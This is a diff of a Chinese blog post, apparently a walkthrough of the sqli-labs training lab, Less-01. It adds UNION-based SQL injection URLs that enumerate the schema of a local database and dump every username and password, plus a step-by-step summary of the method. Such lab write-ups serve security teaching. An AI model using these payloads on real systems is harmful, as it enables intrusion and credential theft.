@@ -59,16 +59,18 @@
   };
 </script>
 
-  <meta name="description" content="MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
+  <meta name="description" content="实战MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
 <meta name="keywords" content="SQL注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之sqli-labs">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;23&#x2F;SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs&#x2F;index.html">
 <meta property="og:site_name" content="lemonl&#39;s Blog">
-<meta property="og:description" content="MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
+<meta property="og:description" content="实战MySQL简单基本用法12345678常用的几个函数：        system_user() —— 系统用户        user() —— 普通用户        current_user() —— 当前用户        database() —— 当前所用的数据库        version() —— 数据库的版本        @@datadir() —— 安装路径">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-01-23T12:33:26.211Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020012418114762.png">
+<meta property="og:updated_time" content="2020-01-24T10:23:05.930Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;2020012418114762.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs/">
 
@@ -238,10 +240,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-01-23 20:21:05 / 修改时间：20:33:26" itemprop="dateCreated datePublished" datetime="2020-01-23T20:21:05+08:00">2020-01-23</time>
+              <time title="创建时间：2020-01-23 20:21:05" itemprop="dateCreated datePublished" datetime="2020-01-23T20:21:05+08:00">2020-01-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-24 18:23:05" itemprop="dateModified" datetime="2020-01-24T18:23:05+08:00">2020-01-24</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -274,14 +282,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
+              <span>3.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -293,8 +301,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><font color="blue" size="5">MySQL简单基本用法</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用的几个函数：</span><br><span class="line">        system_user() —— 系统用户</span><br><span class="line">        user() —— 普通用户</span><br><span class="line">        current_user() —— 当前用户</span><br><span class="line">        database() —— 当前所用的数据库</span><br><span class="line">        version() —— 数据库的版本</span><br><span class="line">        @@datadir() —— 安装路径</span><br><span class="line">        @@version_compile_os —— 本机系统</span><br></pre></td></tr></table></figure><a id="more"></a>
-
+        <h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a><div align="center"><font color="red">实战</font></div></h2><h4 id="MySQL简单基本用法"><a href="#MySQL简单基本用法" class="headerlink" title="MySQL简单基本用法"></a><font color="blue">MySQL简单基本用法</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常用的几个函数：</span><br><span class="line">        system_user() —— 系统用户</span><br><span class="line">        user() —— 普通用户</span><br><span class="line">        current_user() —— 当前用户</span><br><span class="line">        database() —— 当前所用的数据库</span><br><span class="line">        version() —— 数据库的版本</span><br><span class="line">        @@datadir() —— 安装路径</span><br><span class="line">        @@version_compile_os —— 本机系统</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 <p>假定：数据库名-security，表名-users</p>
 <ul>
@@ -310,8 +317,29 @@
 <h4 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h4><p>构造payload: <a href="http://127.0.0.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1</a></p>
 <p>得到 name:Dumb, password:Dumb</p>
 <p>—— 当然，可以改变后面id的值，会得到不同的name和password</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1. # 其中limit后面的第一位(0)表示从第几个开始，第二位表示显示多少个数据(1)</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">    得到的SQL语句为：select * from users where id=&apos;1&apos; limit 0,1 </span><br><span class="line"></span><br><span class="line">2. # A and B —— 当A和B都为1时，结果为true; A or B —— A、B任何一个为1，结果都为true</span><br><span class="line">   # --+  # -- 都表示注释符</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; or 1=1--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&apos;1&apos; or 1=1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">3. # orber by 表示对表中的某个字段进行排序</span><br><span class="line">   # 通过order by 语句可以确定数据列数，本题包含id在内有3个字段</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; order by 1--+</span><br><span class="line">    得到sql语句为：SELECT * FROM users WHERE id=&apos;1&apos; order by 1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">4. # 联合查询union的作用是将两个select查询结果和并</span><br><span class="line">   # 通过将id改为-1，判断显示的内容在数据库的第几列</span><br><span class="line">   # 得到login name在第2列，Password在第3列</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,3--+</span><br><span class="line">   得到sql语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">5. # 选3的位置作为回显位置，获取username或者password</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,schema_name from 	   information_schema.schemata limit 0,1--+</span><br><span class="line">   得到SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,schema_name from information_schema.schemata LIMIT 0,1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">6. # group_concat(),可以将所有的数据拼接在一行显示  		    </span><br><span class="line">   # 详情見本链接 https://www.yiibai.com/mysql/group_concat.html</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 0,1-- &apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1. # 其中limit后面的第一位(0)表示从第几个开始，第二位表示显示多少个数据(1)</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1</span><br><span class="line">    得到的SQL语句为：select * from users where id=&apos;1&apos; limit 0,1 </span><br><span class="line">    </span><br><span class="line">2. # A and B —— 当A和B都为1时，结果为true; A or B —— A、B任何一个为1，结果都为true</span><br><span class="line">   # --+  # -- 都表示注释符</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; or 1=1--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&apos;1&apos; or 1=1-- &apos; LIMIT 0,1</span><br><span class="line">    </span><br><span class="line">3. # orber by 表示对表中的某个字段进行排序</span><br><span class="line">   # 通过order by 语句可以确定数据列数，本题包含id在内有3个字段</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=1&apos; order by 1--+</span><br><span class="line">    得到sql语句为：SELECT * FROM users WHERE id=&apos;1&apos; order by 1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">4. # 联合查询union的作用是将两个select查询结果和并</span><br><span class="line">   # 通过将id改为-1，判断显示的内容在数据库的第几列</span><br><span class="line">   # 得到login name在第2列，Password在第3列</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,3--+</span><br><span class="line">   得到sql语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,3-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">5. # 选3的位置作为回显位置，获取username或者password</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,schema_name from 	   information_schema.schemata limit 0,1--+</span><br><span class="line">   得到SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,schema_name from information_schema.schemata LIMIT 0,1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">6. # group_concat(),可以将所有的数据拼接在一行显示  		    </span><br><span class="line">   # 详情見本链接 https://www.yiibai.com/mysql/group_concat.html</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 0,1-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">7. # 得到表信息, emails,referers,uagents,users</span><br><span class="line">   # 但是后面的security两边的引号较为危险，推荐将其改为十六进制的形式</span><br><span class="line">   # 即为：table_schema=0x7365637572697479</span><br><span class="line">    http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">    得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">8. # 得到列信息：id,username,password</span><br><span class="line">   # 16进制为：0x7573657273</span><br><span class="line">   http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line">   得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">9. # 得到password：Dumb,I-kill-		  you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br><span class="line">	http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(password) from security.users--+</span><br><span class="line">	得到得SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(password) from security.users-- &apos; LIMIT 0,1</span><br><span class="line"></span><br><span class="line">10. # concat_ws()函数能将username和password同时取出，用‘-’连接</span><br><span class="line">	# 推荐将连接符号‘-’转换为16进制，0x2D</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?id=-1&apos; union select 1,2,group_concat(concat_ws(&apos;-&apos;,username,password)) from security.users--+</span><br><span class="line">得到的SQL语句为：SELECT * FROM users WHERE id=&apos;-1&apos; union select 1,2,group_concat(concat_ws(&apos;-&apos;,username,password)) from security.users-- &apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
 
+<p>步骤总结：</p>
+<ol>
+<li><p>查看是否有注入</p>
+</li>
+<li><p>查看有多少列</p>
+</li>
+<li><p>查看那些数据可以回显</p>
+</li>
+<li><p>查看当前数据库</p>
+</li>
+<li><p>查看所有的数据库</p>
+</li>
+<li><p>查看所有的表</p>
+</li>
+<li><p>查看所有的信息</p>
+</li>
+<li><p>得到所有的账号和密码</p>
+<div align="center"><img width="500" hight="300" src="https://img-blog.csdnimg.cn/2020012418114762.png"></div>
+
+</li>
+</ol>
 <h4 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h4><hr>
 <p><font color="red" size="5">未完待续<del>~</del></font></p>
 <hr>
@@ -393,7 +421,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-01"><span class="nav-number">1.</span> <span class="nav-text">Less-01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-02"><span class="nav-number">2.</span> <span class="nav-text">Less-02</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#实战"><span class="nav-number">1.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL简单基本用法"><span class="nav-number">1.0.1.</span> <span class="nav-text">MySQL简单基本用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-01"><span class="nav-number">1.0.2.</span> <span class="nav-text">Less-01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-02"><span class="nav-number">1.0.3.</span> <span class="nav-text">Less-02</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -468,7 +496,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020-01-23</span>
+  <span itemprop="copyrightYear">2020-01-24</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -477,12 +505,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">48k</span>
+    <span title="站点总字数">50k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">44 分钟</span>
+    <span title="站点阅读时长">45 分钟</span>
 </div>
 
 
